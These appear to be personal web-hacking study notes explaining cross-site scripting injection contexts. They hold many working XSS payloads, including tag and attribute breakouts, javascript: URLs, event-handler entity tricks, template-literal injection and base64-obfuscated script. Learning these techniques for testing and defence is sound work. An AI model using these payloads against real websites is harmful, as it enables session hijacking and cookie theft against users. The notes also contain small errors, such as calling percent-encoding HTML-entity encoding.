<h1><u>Cross-site script contexts</u></h1>

When testing for reflected and stored XSS
the key is to identify its context.
by context we mean exactly the location of syntax which
it exit with in. or in other words the place of injected 
input in the front end code and figuring out what payload 

<h2><u>XSS between HTML tags</u></h2>

When the XSS injected context is b/w html tages, 
you need to inject new html tags designed to trigger some 
javascript


```
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
```

<h2><u>XSS in HTML tags attributes</u></h2>

<b>when xss is in a tag attribute:</b>
1. First try to terminate the attribute value, close the tag, and
   and inject new tag
   ```
   "><script>alert(1)</script>
   "><script>alert(document.domain)</script>
	```

2. Alot of times angle brackets are blocked inject 
   a attribute and the value that runs a javascript.
   
`" autofocus onfocus=alert(document.domain) x="`

The above payload creates an `onfocus` event that will execute JavaScript when the element receives the focus, and also adds the `autofocus` attribute to try to trigger the `onfocus` event automatically without any user interaction. Finally, it adds `x="` to gracefully repair the following markup

3. sometimes xss can be placed in scrip table context.
you can execute js without needing to terminate the tag 
like:
`<a href="javascript:alert(document.domain)">`

4. even encounter websites with which you can inject 
xss in to it's tags and cause a javascript. injections
are possiable even with in tags which doesn't fire automatically
like when using `accesskey` which only runs a script in `<input>`
tag when certain combination of keys are pressed.

`<input type="hidden" accesskey="X" onclick="alert(1)">`
provided you can persuade the victim into pressing the key combination. On Firefox Windows/Linux the key combination is ALT+SHIFT+X and on OS X it is CTRL+ALT+X. You can specify a different key combination using a different key in the access key attribute.

<h2><u>XSS into JavaScript </u></h2>

<h3>Terminating the existing script</h3>

lets consider the following:


```
<script>
	var input = 'controllable data here'; 
</script>
```

you can terminate the JavaScript:
`'</script><img src='#' onerror=alert(document.domain)>`

This will work because browser first parse html tags to identify 
page elements; including blocks of script. it then later performs 
the JavaScript parsing and runs the JavaScript 


<h3>Making use of html encoded characters</h3>
in case injection resides in side a event handler, you can use html-encode
quotation marks to bypass the application sanitation and break out the string 
you control

for example if you can control the value `foo` in:

```
<a href="#" onclick="var a = 'foo'; 
```

and the application is properly escaping quotation marks and
backslashes in your input:
`for&apos;; alert(1);//';`


The fact that event handlers are HTML-decoded before being executed
as JavaScript

`<a href="#" onclick="var a = 'foo&apos;; alert(1);//';`

even handlers are html decoded before being executed as 
JavaScript represents an important caveat to standard 
recommendation of HTML encoding user input originally made
to prevent XSS. Can be used by hackers in syntactic context, 
html encoding is not gonna always protect.


<h3><u>XSS in javascript template literals</h3></u>

but first javascript lesson:
https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals

basically if xss injection is in JavaScript 
and in \`\` then you must do insert a payload with
format of ${...} for example:


```
<script> 

var input = `controllable data here`;  

</script>
```

now the payload will be for poping up 
a alert `${alert(1)}` and `${alert(document.cookie)}`


<h2><u>Client-Side template Injection</u></h2>


check out: [This file](obsidian://open?vault=Web-hacking-techniques&file=XSS%2Fclient-side-templete%2FClient-Side%20temeplate%20injection)


<h2><u>obfuscation</u></h2>

Data protocol inside script with base64
`<script src=data:text/javascript;base64,YWxlcnQoMSk=></script>`

Data protocol, encoded with html entity and base64

`<script src=data:text/javascript;base64,%59%57%78%6c%63%6e%51%6f%4d%53%6b%3d></script>`

the payload when decode from html entity revels
a base64 string when decoded again with base64 it 
then becomes 
`alert(1)`

with img.

```
<img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`>
```